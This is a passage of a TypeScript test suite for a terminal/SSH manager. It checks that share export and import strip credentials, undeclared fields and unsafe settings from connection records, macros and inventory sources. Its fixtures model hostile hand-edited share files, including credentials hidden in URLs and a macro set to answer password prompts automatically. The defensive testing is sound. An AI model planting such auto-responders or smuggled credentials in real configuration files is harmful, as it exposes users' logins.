    expect(keysOf(result.deviceTemplates[0].fields)).toEqual(SHIPPED_TEMPLATE_FIELD_KEYS);
    expectNestedRecordsRebuilt(result.inventorySources[0], result.deviceTemplates[0], result.servers.find((s) => s.origin !== undefined)!);
    expect(JSON.stringify(result)).not.toContain("must-not-travel");
  });

  it("import: a hand-edited file's source, origin, templated stamps and template land with exactly the decided fields (⊘ a spread, which persists a stamp this build never wrote for a later build to trust)", async () => {
    const recipient = await makeMachine();

    await importShare(
      recipient,
      shareJson({
        authProfiles: [makeProfile({ id: "ap-ssh", name: "SSH", username: "user" }), makeProfile({ id: "ap-bmc", name: "BMC", username: "user" })],
        deviceTemplates: [everyTemplateField()],
        inventorySources: [everySourceField({ defaultUsername: "user" })],
        servers: [
          makeServer({ id: "bastion-1", name: "Bastion", username: "user" }),
          makeServer({ id: "gw-1", name: "Gateway", username: "user" }),
          syncedRow({
            username: "user",
            authProfileId: "ap-ssh",
            ipmiAuthProfileId: "ap-bmc",
            ipmiGatewayServerId: "gw-1",
            proxy: sshVia("bastion-1"),
            origin: everyOriginField("src-1", { jump: "bastion-1", gateway: "gw-1", ssh: "ap-ssh", bmc: "ap-bmc" })
          })
        ]
      })
    );

    const snapshot = recipient.core.getSnapshot();
    // NexusCore mints `revision` on every write; everything else is the share's.
    expect(keysOf(snapshot.inventorySources[0])).toEqual([...SHIPPED_SOURCE_KEYS, "revision"].sort());
    const origin = snapshot.servers.find((s) => s.origin !== undefined)!.origin!;
    expect(keysOf(origin)).toEqual(SHIPPED_ORIGIN_KEYS);
    expect(keysOf(origin.templated)).toEqual(SHIPPED_TEMPLATED_KEYS);
    expect(keysOf(snapshot.deviceTemplates[0])).toEqual([...SHIPPED_TEMPLATE_KEYS, "revision"].sort());
    expect(keysOf(snapshot.deviceTemplates[0].fields)).toEqual(SHIPPED_TEMPLATE_FIELD_KEYS);
    expectNestedRecordsRebuilt(snapshot.inventorySources[0], snapshot.deviceTemplates[0], snapshot.servers.find((s) => s.origin !== undefined)!);
    expect(JSON.stringify(snapshot)).not.toContain("must-not-travel");
  });
});

/**
 * Issue #179 — the collections the share path copied by spread until the
 * inventory records moved onto rules tables: servers, tunnels, serial and Local
 * Shell profiles, and macros. Same fixtures' rule as above: every field the
 * model declares is set, plus `futureStamp`, which it does not; a macro's
 * variable entries — the nested record a share rebuilds for macros — carry an
 * undeclared `token`.
 */
const FUTURE = { futureStamp: "must-not-travel" };
const ALL_ORIGIN_LINKS = { jump: "bastion-1", gateway: "gw-1", ssh: "ap-ssh", bmc: "ap-bmc" };

function everyServerField(): ServerConfig {
  return {
    id: "every",
    name: "Every field",
    group: "Lab/Core",
    host: "10.0.0.9",
    port: 2222,
    addressless: false,
    protocol: "ssh",
    altHost: "fd00::9",
    username: "netops",
    authType: "key",
    keyPath: "/home/netops/.ssh/id_ed25519",
    isHidden: true,
    logSession: true,
    multiplexing: false,
    legacyAlgorithms: true,
    ipmiHost: "10.9.9.9",
    ipmiAuthProfileId: "ap-bmc",
    bmcWebProtocol: "http",
    ipmiGatewayServerId: "gw-1",
    openFileExplorerOnFirstConnect: true,
    proxy: sshVia("bastion-1"),
    authProfileId: "ap-ssh",
    origin: everyOriginField("src-1", ALL_ORIGIN_LINKS),
    formerlySynced: { sourceId: "src-gone", sourceName: "Old NetBox", providerId: "netbox", externalId: "device:9", detachedAt: 1 },
    ...FUTURE
  } as ServerConfig;
}

function everyTunnelField(): TunnelProfile {
  return {
    id: "tun-1",
    name: "Web UI",
    localPort: 8080,
    remoteIP: "127.0.0.1",
    remotePort: 80,
    defaultServerId: "every",
    autoStart: true,
    autoStop: true,
    connectionMode: "shared",
    tunnelType: "local",
    remoteBindAddress: "127.0.0.1",
    localTargetIP: "127.0.0.1",
    localBindAddress: "127.0.0.1",
    notes: "the router's web UI",
    browserUrl: "http://localhost:8080",
    ...FUTURE
  } as TunnelProfile;
}

function everySerialField(): SerialProfile {
  return {
    id: "ser-1",
    name: "Console",
    group: "Bench",
    path: "/dev/ttyUSB0",
    baudRate: 115200,
    dataBits: 8,
    stopBits: 1,
    parity: "none",
    rtscts: false,
    logSession: true,
    mode: "smartFollow",
    deviceHint: { manufacturer: "FTDI", serialNumber: "SENDER-ADAPTER", vendorId: "0403", productId: "6001" },
    ...FUTURE
  } as SerialProfile;
}

function everyLocalShellField(): LocalShellProfile {
  return {
    id: "sh-1",
    name: "Build shell",
    group: "Dev",
    launchMode: "custom",
    vscodeProfileName: "bash",
    shellPath: "/bin/bash",
    shellArgs: ["-l"],
    cwd: "/home/netops/project",
    env: { API_TOKEN: "SENDER-TOKEN" },
    startupCommand: "make watch",
    ...FUTURE
  } as LocalShellProfile;
}

/** A trigger macro and a prompted-variables one (the two are exclusive on import), each with every other field set. */
function everyMacroField(): TerminalMacro[] {
  const common = {
    text: "show version\n",
    keybinding: "alt+shift+1",
    slot: 1,
    secret: false,
    group: "Cisco",
    runIn: "session" as const,
    provideIpmiCredentials: true,
    route: "ipmiGateway" as const,
    ...FUTURE
  };
  return [
    {
      ...common,
      id: "m-trigger",
      name: "Answer prompt",
      triggerPattern: "Press RETURN",
      triggerCooldown: 5,
      triggerInterval: 60,
      triggerInitiallyDisabled: true,
      triggerScope: "profile",
      triggerProfileId: "every"
    },
    {
      ...common,
      id: "m-vars",
      name: "Login",
      keybinding: "alt+shift+2",
      slot: 2,
      variables: [
        { name: "host", label: "Host", default: "10.0.0.1", remember: false, ...UNDECLARED },
        { name: "password", label: "Password", secret: true, ...UNDECLARED }
      ]
    }
  ] as TerminalMacro[];
}

const SHIPPED_SERVER_KEYS = [
  "addressless", "altHost", "authProfileId", "authType", "bmcWebProtocol", "group", "host", "id", "ipmiAuthProfileId",
  "ipmiGatewayServerId", "ipmiHost", "isHidden", "keyPath", "legacyAlgorithms", "logSession", "multiplexing", "name",
  "openFileExplorerOnFirstConnect", "origin", "port", "protocol", "proxy", "username"
];
const SHIPPED_TUNNEL_KEYS = [
  "autoStart", "autoStop", "browserUrl", "connectionMode", "defaultServerId", "id", "localBindAddress", "localPort",
  "localTargetIP", "name", "notes", "remoteBindAddress", "remoteIP", "remotePort", "tunnelType"
];
const SHIPPED_SERIAL_KEYS = ["baudRate", "dataBits", "group", "id", "logSession", "mode", "name", "parity", "path", "rtscts", "stopBits"];
const SHIPPED_LOCAL_SHELL_KEYS = ["group", "id", "launchMode", "name", "shellArgs", "shellPath", "vscodeProfileName"];
const SHIPPED_MACRO_KEYS = [
  "group", "id", "keybinding", "name", "provideIpmiCredentials", "route", "runIn", "secret", "slot", "text", "triggerCooldown",
  "triggerInitiallyDisabled", "triggerInterval", "triggerPattern", "triggerProfileId", "triggerScope", "variables"
];
const TRIGGER_KEYS = ["triggerCooldown", "triggerInitiallyDisabled", "triggerInterval", "triggerPattern", "triggerProfileId", "triggerScope"];
const CAPABILITY_KEYS = ["provideIpmiCredentials", "route"];
const without = (keys: string[], ...removed: string[][]): string[] => keys.filter((key) => !removed.flat().includes(key));

describe("which fields a share carries — servers, tunnels, serial and Local Shell profiles, macros (#179)", () => {
  it("export: each record carries exactly the decided fields, and a macro variable exactly its declared ones (⊘ a spread, which ships a member the model does not declare — or one added to it later — by default)", () => {
    const result = sanitizeForSharing(
      [makeServer({ id: "bastion-1", name: "Bastion" }), makeServer({ id: "gw-1", name: "Gateway" }), everyServerField()],
      [everyTunnelField()],
      [everySerialField()],
      [everyLocalShellField()],
      {},
      [makeProfile({ id: "ap-ssh", name: "SSH" }), makeProfile({ id: "ap-bmc", name: "BMC" })],
      everyMacroField(),
      [makeSource()],
      [],
      []
    );

    const server = result.servers.find((s) => s.name === "Every field")!;
    expect(keysOf(server)).toEqual(SHIPPED_SERVER_KEYS);
    expect(server).toMatchObject({ username: "user", keyPath: "" });
    expect(keysOf(result.tunnels[0])).toEqual(SHIPPED_TUNNEL_KEYS);
    expect(result.tunnels[0].defaultServerId).toBe(server.id);
    expect(keysOf(result.serialProfiles[0])).toEqual(SHIPPED_SERIAL_KEYS);
    expect(keysOf(result.localShellProfiles[0])).toEqual(SHIPPED_LOCAL_SHELL_KEYS);
    expect(result.macros.map(keysOf)).toEqual([without(SHIPPED_MACRO_KEYS, ["variables"]), without(SHIPPED_MACRO_KEYS, TRIGGER_KEYS)]);
    expect(result.macros[1].variables).toEqual([
      { name: "host", label: "Host", default: "10.0.0.1", remember: false },
      { name: "password", label: "Password", secret: true }
    ]);
    expect(JSON.stringify(result)).not.toMatch(/must-not-travel|SENDER-ADAPTER|SENDER-TOKEN|netops|make watch/);
  });

  it("import: a hand-edited file's records land with exactly the decided fields (⊘ spreading the file's record, which persists whatever the file put beside the declared fields)", async () => {
    const recipient = await makeMachine();

    await importShare(
      recipient,
      shareJson({
        authProfiles: [makeProfile({ id: "ap-ssh", name: "SSH", username: "user" }), makeProfile({ id: "ap-bmc", name: "BMC", username: "user" })],
        inventorySources: [makeSource({ defaultUsername: "user" })],
        servers: [makeServer({ id: "bastion-1", name: "Bastion", username: "user" }), makeServer({ id: "gw-1", name: "Gateway", username: "user" }), everyServerField()],
        tunnels: [everyTunnelField()],
        serialProfiles: [everySerialField()],
        localShellProfiles: [everyLocalShellField()],
        macros: everyMacroField()
      })
    );

    const snapshot = recipient.core.getSnapshot();
    const server = snapshot.servers.find((s) => s.name === "Every field")!;
    expect(keysOf(server)).toEqual(SHIPPED_SERVER_KEYS);
    expect(server).toMatchObject({ username: "user", keyPath: "" });
    expect(keysOf(snapshot.tunnels[0])).toEqual(SHIPPED_TUNNEL_KEYS);
    expect(snapshot.tunnels[0].defaultServerId).toBe(server.id);
    expect(keysOf(snapshot.serialProfiles[0])).toEqual(SHIPPED_SERIAL_KEYS);
    expect(keysOf(snapshot.localShellProfiles[0])).toEqual(SHIPPED_LOCAL_SHELL_KEYS);
    // What the macro import removes on top, as it always has: capability flags
    // never survive an import (`sanitizeImportedMacro`).
    const macros = getMacros();
    expect(macros.map(keysOf)).toEqual([
      without(SHIPPED_MACRO_KEYS, ["variables"], CAPABILITY_KEYS),
      without(SHIPPED_MACRO_KEYS, TRIGGER_KEYS, CAPABILITY_KEYS)
    ]);
    expect(macros[1].variables).toEqual([
      { name: "host", label: "Host", default: "10.0.0.1", remember: false },
      { name: "password", label: "Password", secret: true }
    ]);
    expect(JSON.stringify([snapshot, macros])).not.toMatch(/must-not-travel|SENDER-ADAPTER|SENDER-TOKEN|netops|make watch/);
  });

  it("import: a macro whose variables is malformed still loses its auto-trigger — the import judges the file's value, not the export's redaction of it (⊘ `variables` made symmetric with the export's `shareMacroVariables`, which drops the value before `sanitizeImportedMacro` can count it as a declaration and lands a live `Password:` responder)", async () => {
    const recipient = await makeMachine();
    const responder = { text: "hunter2\n", triggerPattern: "[Pp]assword:" };

    await importShare(
      recipient,
      shareJson({
        macros: [
          { ...responder, id: "m-string", name: "String variables", variables: "abc" },
          { ...responder, id: "m-array-like", name: "Array-like variables", variables: { 0: { name: "password", secret: true }, length: 1 } }
        ]
      })
    );

    const landed = getMacros();
    expect(landed.map((m) => m.name)).toEqual(["String variables", "Array-like variables"]);
    for (const macro of landed) {
      expect(macro).not.toHaveProperty("triggerPattern");
      expect(macro).not.toHaveProperty("variables");
    }
  });

  it("an older share file — the records a spread-era export wrote — imports exactly as it did (⊘ a rules table that drops or rewrites a field a share has always carried)", async () => {
    const recipient = await makeMachine();
    const jump = makeServer({ id: "old-jump", name: "Jump", username: "user", keyPath: "" });
    const target = makeServer({
      id: "old-target",
      name: "Target",
      group: "Old/Site",
      username: "user",
      authType: "key",
      keyPath: "",
      altHost: "fd00::2",
      isHidden: false,
      logSession: true,
      multiplexing: true,
      legacyAlgorithms: false,
      ipmiHost: "10.9.9.2",
      bmcWebProtocol: "https",
      proxy: { type: "ssh", jumpHostId: "old-jump" },
      authProfileId: "old-ap"
    });
    const tunnel = { id: "old-tun", name: "DB", localPort: 15432, remoteIP: "10.0.0.5", remotePort: 5432, defaultServerId: "old-target", autoStart: false, connectionMode: "isolated", tunnelType: "local", notes: "db" };
    const serial = { id: "old-ser", name: "Switch console", group: "Bench", path: "COM3", baudRate: 9600, dataBits: 8, stopBits: 1, parity: "none", rtscts: false, mode: "standard" };
    const shell = { id: "old-sh", name: "Pwsh", launchMode: "vscodeProfile", vscodeProfileName: "PowerShell", group: "Win" };
    const macro = { id: "old-m", name: "Save config", text: "write memory\n", keybinding: "alt+s", group: "Cisco" };

    await importShare(
      recipient,
      shareJson({
        authProfiles: [makeProfile({ id: "old-ap", name: "Ops", username: "user", authType: "password" })],
        servers: [jump, target],
        tunnels: [tunnel],
        serialProfiles: [serial],
        localShellProfiles: [shell],
        macros: [macro]
      })
    );

    const snapshot = recipient.core.getSnapshot();
    const byName = new Map(snapshot.servers.map((s) => [s.name, s]));
    const landedJump = byName.get("Jump")!;
    const [profile] = snapshot.authProfiles;
    expect(landedJump).toEqual({ ...jump, id: expect.any(String) });
    expect(byName.get("Target")).toEqual({ ...target, id: expect.any(String), proxy: { type: "ssh", jumpHostId: landedJump.id }, authProfileId: profile.id });
    expect(snapshot.tunnels).toEqual([{ ...tunnel, id: expect.any(String), defaultServerId: byName.get("Target")!.id }]);
    expect(snapshot.serialProfiles).toEqual([{ ...serial, id: expect.any(String) }]);
    expect(snapshot.localShellProfiles).toEqual([{ ...shell, id: expect.any(String) }]);
    expect(getMacros()).toEqual([{ ...macro, id: expect.any(String) }]);
    for (const record of [landedJump, snapshot.tunnels[0], snapshot.serialProfiles[0], snapshot.localShellProfiles[0]]) {
      expect(record.id).not.toMatch(/^old-/);
    }
  });
});

describe("an auth profile in a share — rebuilt from its declared fields", () => {
  it("export: carries exactly id, name, authType and username \"user\", whichever record reaches it — a server's link, a source's or a template's (⊘ a spread, which ships a stored `token` or any member added to the model later)", () => {
    const template: DeviceTemplateProfile = { id: "tpl-1", name: "Core", fields: { ipmiAuthProfileId: { mode: "fill", value: "ap-template" } } };
    const source = makeSource({ authProfileId: "ap-source", templateRules: [{ id: "rule-1", templateId: "tpl-1" }] });
    const server = makeServer({ id: "manual", name: "manual", authProfileId: "ap-server" });
    const profiles = [everyProfileField("ap-server", "Server's"), everyProfileField("ap-source", "Source's"), everyProfileField("ap-template", "Template's")];

    const result = sanitizeForSharing([server], [], [], [], {}, profiles, [], [source], [template]);

    expect(result.authProfiles.map((p) => p.name).sort()).toEqual(["Server's", "Source's", "Template's"]);
    for (const shipped of result.authProfiles) {
      expect(keysOf(shipped)).toEqual(SHIPPED_PROFILE_KEYS);
      expect(shipped.username).toBe("user");
    }
    expect(JSON.stringify(result)).not.toMatch(/must-not-travel|netops/);
  });

  it("import: a hand-edited file's profile lands with exactly id, name, authType and username \"user\" — no key file, no stored `token` (⊘ spreading the file's record, which persists whatever a hand-edited file put there)", async () => {
    const recipient = await makeMachine();

    await importShare(
      recipient,
      shareJson({
        authProfiles: [everyProfileField("ap-1", "From the file")],
        servers: [makeServer({ id: "manual", name: "manual", username: "user", authProfileId: "ap-1" })]
      })
    );

    const snapshot = recipient.core.getSnapshot();
    const [landed] = snapshot.authProfiles;
    expect(keysOf(landed)).toEqual(SHIPPED_PROFILE_KEYS);
    expect(landed).toMatchObject({ name: "From the file", username: "user", authType: "password" });
    expect(snapshot.servers[0].authProfileId).toBe(landed.id);
    expect(JSON.stringify(snapshot)).not.toMatch(/must-not-travel|netops/);
  });
  it("import: a malformed key path is dropped with the key path, not held against the profile (⊘ validating the file's record before rebuilding it, which rejects the profile and strands every server linked to it)", async () => {
    const recipient = await makeMachine();

    await importShare(
      recipient,
      shareJson({
        authProfiles: [{ ...makeProfile({ id: "ap-1", name: "Malformed key path", username: "user" }), keyPath: 12345 }],
        servers: [makeServer({ id: "manual", name: "manual", username: "user", authProfileId: "ap-1" })]
      })
    );

    const snapshot = recipient.core.getSnapshot();
    expect(snapshot.authProfiles.map((p) => p.name)).toEqual(["Malformed key path"]);
    expect(snapshot.authProfiles[0]).not.toHaveProperty("keyPath");
    expect(snapshot.servers[0].authProfileId).toBe(snapshot.authProfiles[0].id);
  });
});

describe("a value stored under a secret field id", () => {
  it("never travels, for any provider, in either direction (⊘ a plaintext credential that once landed in `config` riding out in a file promised to carry none)", async () => {
    const leaky = (providerId: string, id: string) =>
      makeSource({ id, providerId, defaultUsername: "user", secretFieldIds: ["apiToken"], config: { baseUrl: "https://inv.example.com", apiToken: "PLAINTEXT-TOKEN" } });

    const exported = sanitizeForSharing([], [], [], [], {}, [], [], [leaky("netbox", "nb"), leaky("acme.cmdb", "acme")], [], []);
    expect(JSON.stringify(exported.inventorySources)).not.toContain("PLAINTEXT-TOKEN");
    for (const source of exported.inventorySources) {
      expect(source.config).toEqual({ baseUrl: "https://inv.example.com" });
      expect(source.secretFieldIds).toEqual(["apiToken"]);
    }

    const recipient = await makeMachine();
    await importShare(recipient, shareJson({ inventorySources: [leaky("netbox", "nb"), leaky("acme.cmdb", "acme")] }));
    expect(recipient.core.getSnapshot().inventorySources).toHaveLength(2);
    expect(JSON.stringify(recipient.core.getSnapshot().inventorySources)).not.toContain("PLAINTEXT-TOKEN");
  });
});

/**
 * Every rewrite a share applies on the way OUT is applied again on the way IN,
 * because a share file is untrusted and a hand-edited one can put back anything
 * the export removed. Each fixture below is such a file.
 */
describe("the same rules in both directions — a hand-edited file", () => {
  it("strips credentials from a synced server's instance key, on export and on import (⊘ a third-party provider's `https://user:token@host` key riding out in `origin.syncedInstanceKey`, which the config rule never sees)", async () => {
    const keyed = syncedRow({ origin: { ...syncedRow().origin!, syncedInstanceKey: "https://svc:tok3n@cmdb.example.com/api" } });

    const exported = sanitizeForSharing([keyed], [], [], [], {}, [], [], [makeSource({ providerId: "acme.cmdb" })], [], []);
    expect(exported.servers[0].origin!.syncedInstanceKey).toBe("https://cmdb.example.com/api");
    expect(JSON.stringify(exported)).not.toContain("tok3n");

    const recipient = await makeMachine();
    await importShare(recipient, shareJson({ inventorySources: [makeSource({ providerId: "acme.cmdb", defaultUsername: "user" })], servers: [keyed] }));
    const [row] = recipient.core.getSnapshot().servers;
    expect(row.origin?.syncedInstanceKey).toBe("https://cmdb.example.com/api");
    expect(JSON.stringify(recipient.core.getSnapshot())).not.toContain("tok3n");
  });

  it("rebuilds a SOCKS5/HTTP proxy from type, host and port on import — in a server, its templated stamp and a device template alike (⊘ the sender's proxy login landing from a hand-edited file)", async () => {
    const recipient = await makeMachine();
    const socks = { type: "socks5" as const, host: "proxy.example.com", port: 1080, username: "proxy-login" };
    const http = { type: "http" as const, host: "web-proxy.example.com", port: 3128, username: "proxy-login" };

    await importShare(
      recipient,
      shareJson({
        inventorySources: [makeSource({ defaultUsername: "user", templateRules: [{ id: "rule-1", templateId: "tpl-1" }] })],
        deviceTemplates: [{ id: "tpl-1", name: "Via proxy", fields: { proxy: { mode: "override", value: http } } }],
        servers: [
          syncedRow({ username: "user", proxy: socks, origin: { ...syncedRow().origin!, templated: { proxy: socks } } }),
          makeServer({ id: "manual", name: "Manual", username: "user", proxy: http })
        ]
      })
    );

    const snapshot = recipient.core.getSnapshot();
    expect(JSON.stringify(snapshot)).not.toContain("proxy-login");
    const row = snapshot.servers.find((s) => s.origin !== undefined)!;
    expect(row.proxy).toEqual({ type: "socks5", host: "proxy.example.com", port: 1080 });
    // Still template-owned: value and stamp rebuilt by the same rule.
    expect(row.origin?.templated?.proxy).toEqual(row.proxy);
    expect(snapshot.servers.find((s) => s.name === "Manual")!.proxy).toEqual({ type: "http", host: "web-proxy.example.com", port: 3128 });
    expect(snapshot.deviceTemplates[0].fields.proxy?.value).toEqual({ type: "http", host: "web-proxy.example.com", port: 3128 });
  });

  it("rewrites a source's defaultUsername, and every server's username — a synced row's with its stamp — to \"user\" on import, as the export does (⊘ the file's usernames landing where the export writes \"user\"; ⊘ a stamp rewritten without its value, which reads as a hand edit)", async () => {
    const recipient = await makeMachine();

    await importShare(
      recipient,
      shareJson({
        inventorySources: [makeSource({ defaultUsername: "bob" })],
        servers: [
          syncedRow({ username: "bob", origin: { ...syncedRow().origin!, syncedUsername: "bob" } }),
          syncedRow({ id: "row-legacy", name: "legacy", username: "bob", origin: { sourceId: "src-1", externalId: "device:2", syncedAt: 1 } }),
          makeServer({ id: "manual", name: "Manual", username: "bob" })
        ]
      })
    );

    const snapshot = recipient.core.getSnapshot();
    expect(snapshot.inventorySources[0].defaultUsername).toBe("user");
    const stamped = snapshot.servers.find((s) => s.origin?.externalId === "device:1")!;
    expect(stamped.username).toBe("user");
    expect(stamped.origin?.syncedUsername).toBe("user");
    const legacy = snapshot.servers.find((s) => s.origin?.externalId === "device:2")!;
    expect(legacy.username).toBe("user");
    expect(legacy.origin).not.toHaveProperty("syncedUsername");
    // Not a cached row, and rewritten all the same: the export writes "user" for every server.
    expect(snapshot.servers.find((s) => s.name === "Manual")!.username).toBe("user");
  });

  it("keeps the recipient's first sync a no-op for a third-party provider whose instance key carried credentials (⊘ dropping the key instead of cleaning it, which turns every cached row into an update)", async () => {
    // A provider that breaks the contract: it echoes its base URL, userinfo and all.
    const echoKey = (source: InventorySourceConfig): string | undefined => String(source.config.baseUrl);
    const tree: InventoryTree = { contractVersion: 1, devices: [{ externalId: "asset:1", name: "rtr-1", endpoints: [{ kind: "ssh", host: "10.1.1.1" }] }] };
    const planFor = (machine: Machine, source: InventorySourceConfig) =>
      computeSyncPlan({ source, tree, currentServers: machine.core.getSnapshot().servers, now: 1_800_000_000_000, providerInstanceKey: echoKey(source) });

    const sender = await makeMachine();
    await sender.core.addOrUpdateInventorySource(
      makeSource({ providerId: "acme.cmdb", secretFieldIds: [], config: { baseUrl: "https://svc:tok3n@cmdb.example.com/api" } })
    );
    const source = sender.core.getInventorySource("src-1")!;
    const plan = planFor(sender, source);
    await sender.core.applyInventorySyncPlan(planToApplication(plan, source));
    expect(sender.core.getSnapshot().servers[0].origin?.syncedInstanceKey).toContain("tok3n"); // premise

    const json = await exportShare(sender);
    expect(json).not.toContain("tok3n");
    const recipient = await makeMachine();
    await importShare(recipient, json);

    const [imported] = recipient.core.getSnapshot().inventorySources;
    const first = planFor(recipient, imported);
    expect(first.adds).toEqual([]);
    expect(first.prunes).toEqual([]);
    expect(first.updates).toEqual([]);
    expect(first.unchangedCount).toBe(1);
  });
});

// ---------------------------------------------------------------------------
// Import: what `importShareData` persists from a share file
// ---------------------------------------------------------------------------

describe("share import — inventory sources", () => {
  it("persists each source with a fresh id and a minted revision, and never the bookkeeping or trust stamp a hand-edited file carries (⊘ any of them landing)", async () => {
    const recipient = await makeMachine();

    await importShare(
      recipient,
      shareJson({
        inventorySources: [
          makeSource({
            defaultUsername: "user",
            revision: "rev-from-file",
            providerFingerprint: "fp-from-file",
            managedFolders: ["NetBox/Staging"],
            lastSyncAt: 1_700_000_000_000
          })
        ]
      })
    );

    const [source] = recipient.core.getSnapshot().inventorySources;
    expect(source.id).not.toBe("src-1");
    expect(source.revision).toEqual(expect.any(String));
    expect(source.revision).not.toBe("rev-from-file");
    for (const key of ["providerFingerprint", "managedFolders", "lastSyncAt"]) {
      expect(source).not.toHaveProperty(key);
    }
  });

  it("does not let a malformed bookkeeping field cost the source (⊘ stripping after validation, which rejects the whole record)", async () => {
    const recipient = await makeMachine();

    await importShare(
      recipient,
      shareJson({ inventorySources: [{ ...makeSource({ defaultUsername: "user" }), revision: 42, managedFolders: "oops", lastSyncAt: "yesterday", providerFingerprint: "" }] })
    );

    expect(recipient.core.getSnapshot().inventorySources).toHaveLength(1);
  });

  it("re-applies the config rule on the way in, so a hand-edited file cannot restore what the export removed (⊘ trusting the file to have come from our exporter)", async () => {
    const recipient = await makeMachine();

    await importShare(
      recipient,
      shareJson({
        inventorySources: [
          makeSource({ id: "nb", defaultUsername: "user", config: { baseUrl: "https://reader:s3cret@netbox.example.com/", allowInsecureTls: true } }),
          makeSource({
            id: "eve",
            providerId: EVE_NG_PROVIDER_ID,
            defaultUsername: "user",
            secretFieldIds: ["password"],
            config: { baseUrl: "https://eve.example.com", username: "eve-admin", allowInsecureTls: true, statusPollSeconds: 30 }
          }),
          makeSource({
            id: "acme",
            providerId: "acme.cmdb",
            defaultUsername: "user",
            config: { baseUrl: "https://svc:pw@cmdb.example.com/", allowInsecureTls: true, username: "svc", statusPollSeconds: 5 }
          })
        ]
      })
    );

    const byName = new Map(recipient.core.getSnapshot().inventorySources.map((s) => [s.providerId, s.config]));
    expect(byName.get("netbox")).toEqual({ baseUrl: "https://netbox.example.com/", allowInsecureTls: false });
    expect(byName.get(EVE_NG_PROVIDER_ID)).toEqual({ baseUrl: "https://eve.example.com", allowInsecureTls: false });
    // Third-party: only the credential in the URL goes; its own fields are its own.
    expect(byName.get("acme.cmdb")).toEqual({ baseUrl: "https://cmdb.example.com/", allowInsecureTls: true, username: "svc", statusPollSeconds: 5 });
  });

  it("arrives with Removed-Device Policy Delete set to orphan and says so, while keep and orphan land as they are (⊘ `delete` landing, where a first sync that sees less than the sender's would delete cached rows)", async () => {
    const recipient = await makeMachine();

    await importShare(
      recipient,
      shareJson({
        inventorySources: [
          makeSource({ id: "a", name: "A", defaultUsername: "user", prunePolicy: "delete" }),
          makeSource({ id: "b", name: "B", defaultUsername: "user", prunePolicy: "keep" }),
          makeSource({ id: "c", name: "C", defaultUsername: "user", prunePolicy: "orphan" })
        ]
      })
    );

    const policies = Object.fromEntries(recipient.core.getSnapshot().inventorySources.map((s) => [s.name, s.prunePolicy]));
    expect(policies).toEqual({ A: "orphan", B: "keep", C: "orphan" });
    expect(lastInfoMessage()).toContain("Removed-Device Policy arrived on 1 source as Delete");
    expect(lastInfoMessage()).toContain('"_orphaned"');
  });

  it("says nothing about the policy when no source arrived with Delete (⊘ the note firing unconditionally)", async () => {
    const recipient = await makeMachine();

    await importShare(recipient, shareJson({ inventorySources: [makeSource({ defaultUsername: "user", prunePolicy: "keep" })] }));

    expect(lastInfoMessage()).toBe(
      "Imported 1 inventory source. The source arrives without credentials — add yours in Edit Inventory Source before syncing."
    );
    expect(lastInfoMessage()).not.toContain("Removed-Device Policy");
  });

  it("clears a source's and a template's links to a profile the import rejected, remaps the ones that landed, and prunes template rules to templates that landed (⊘ a dangling reference persisting; ⊘ a file id surviving; ⊘ a malformed template revision costing the template)", async () => {
    const recipient = await makeMachine();

    await importShare(
      recipient,
      shareJson({
        authProfiles: [{ ...makeProfile({ id: "ap-bad", username: "user" }), authType: "sometimes" }, makeProfile({ id: "ap-good", name: "Good", username: "user" })],
        deviceTemplates: [
          {
            id: "tpl-ok",
            name: "Kept",
            revision: 7,
            fields: { multiplexing: { mode: "fill", value: true }, authProfileId: { mode: "fill", value: "ap-good" }, ipmiAuthProfileId: { mode: "fill", value: "ap-bad" } }
          },
          { id: "tpl-bad", name: "Rejected", fields: { multiplexing: { mode: "sometimes", value: true } } }
        ],
        inventorySources: [
          makeSource({
            defaultUsername: "user",
            authProfileId: "ap-bad",
            templateRules: [
              { id: "r-ok", templateId: "tpl-ok" },
              { id: "r-bad", templateId: "tpl-bad" },
              { id: "r-absent", templateId: "tpl-absent" }
            ]
          })
        ]
      })
    );

    const snapshot = recipient.core.getSnapshot();
    expect(snapshot.authProfiles.map((p) => p.name)).toEqual(["Good"]);
    expect(snapshot.deviceTemplates.map((t) => t.name)).toEqual(["Kept"]);
    expect(snapshot.deviceTemplates[0].fields).toEqual({
      multiplexing: { mode: "fill", value: true },
      authProfileId: { mode: "fill", value: snapshot.authProfiles[0].id }
    });
    const [source] = snapshot.inventorySources;
    expect(source.authProfileId).toBeUndefined();
    expect(source.templateRules).toEqual([{ id: "r-ok", templateId: snapshot.deviceTemplates[0].id }]);
  });

  it("imports only the templates a source in the file names, skipping and counting any other — the export's own rule (⊘ a hand-edited file landing templates nothing in it uses)", async () => {
    const recipient = await makeMachine();

    await importShare(
      recipient,
      shareJson({
        deviceTemplates: [
          { id: "tpl-used", name: "Used", fields: { multiplexing: { mode: "fill", value: true } } },
          { id: "tpl-unused", name: "Unrelated template", fields: { proxy: { mode: "override", value: { type: "socks5", host: "unrelated-proxy.example.com", port: 1080 } } } }
        ],
        inventorySources: [makeSource({ defaultUsername: "user", templateRules: [{ id: "rule-1", templateId: "tpl-used" }] })]
      })
    );

    const snapshot = recipient.core.getSnapshot();
    expect(snapshot.deviceTemplates.map((t) => t.name)).toEqual(["Used"]);
    expect(snapshot.inventorySources[0].templateRules).toEqual([{ id: "rule-1", templateId: snapshot.deviceTemplates[0].id }]);
    expect(lastInfoMessage()).toMatch(/\(1 skipped\)/);
  });

  it("imports only the templates a source that LANDS names — a template named only by a source the import rejects stays out, counted as skipped (⊘ deciding by the file's sources before they are validated, which persists a template nothing will use)", async () => {
    const recipient = await makeMachine();

    await importShare(
      recipient,
      shareJson({
        deviceTemplates: [
          { id: "tpl-a", name: "Kept", fields: { multiplexing: { mode: "fill", value: true } } },
          {
            id: "tpl-b",
            name: "Named only by a rejected source",
            fields: { proxy: { mode: "override", value: { type: "socks5", host: "unrelated-proxy.example.com", port: 1080 } } }
          }
        ],
        inventorySources: [
          makeSource({ id: "src-a", defaultUsername: "user", templateRules: [{ id: "rule-a", templateId: "tpl-a" }] }),
          { ...makeSource({ id: "src-b", name: "Rejected", defaultUsername: "user", templateRules: [{ id: "rule-b", templateId: "tpl-b" }] }), prunePolicy: "sometimes" }
        ]
      })
    );

    const snapshot = recipient.core.getSnapshot();
    expect(snapshot.inventorySources.map((s) => s.name)).toEqual(["Lab NetBox"]);
    expect(snapshot.deviceTemplates.map((t) => t.name)).toEqual(["Kept"]);
    expect(snapshot.inventorySources[0].templateRules).toEqual([{ id: "rule-a", templateId: snapshot.deviceTemplates[0].id }]);
    expect(JSON.stringify(snapshot)).not.toContain("unrelated-proxy");
    // The rejected source, and the template only it named.
